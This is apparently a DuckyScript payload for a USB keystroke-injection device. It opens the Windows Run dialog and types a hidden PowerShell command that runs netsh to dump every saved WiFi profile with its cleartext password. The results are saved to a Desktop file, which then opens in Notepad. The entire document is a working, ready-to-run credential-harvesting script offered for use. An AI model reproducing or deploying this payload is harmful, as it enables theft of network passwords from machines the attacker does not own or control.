REM Title: WiFi Password Dump (Windows)
REM Description: Exports all saved WiFi profiles + cleartext keys to Desktop.
REM               Opens the result in Notepad.
REM Target: Windows 10/11 (requires standard user, no admin needed)
REM Author: Hackercat-git

DELAY 1000
GUI r
DELAY 400
STRING powershell -WindowStyle Hidden -Command "& { $out = \"$env:USERPROFILE\Desktop\wifi.txt\"; $profiles = (netsh wlan show profiles) -match 'All User Profile' | ForEach-Object { ($_ -split ':')[1].Trim() }; $results = foreach ($p in $profiles) { $key = (netsh wlan show profile name=$p key=clear) -match 'Key Content'; \"$p : $(($key -split ':')[1].Trim())\" }; $results | Set-Content $out; Start-Process notepad $out }"
ENTER
